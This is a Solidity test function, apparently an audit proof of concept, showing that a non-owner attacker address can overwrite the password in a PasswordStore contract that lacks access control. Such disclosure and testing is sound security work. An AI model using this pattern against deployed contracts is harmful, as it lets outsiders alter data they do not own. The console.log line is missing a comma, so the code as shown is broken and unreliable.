    function test_poc_non_owner_set_password() public {
        // initiate the transaction from the non-owner attacker address
        vm.prank(attacker);
        string memory newPassword = "attackerPassword";
        // attacker attempts to set the password
        passwordStore.setPassword(newPassword);
        console.log("The attacker successfully set the password:" newPassword);
    }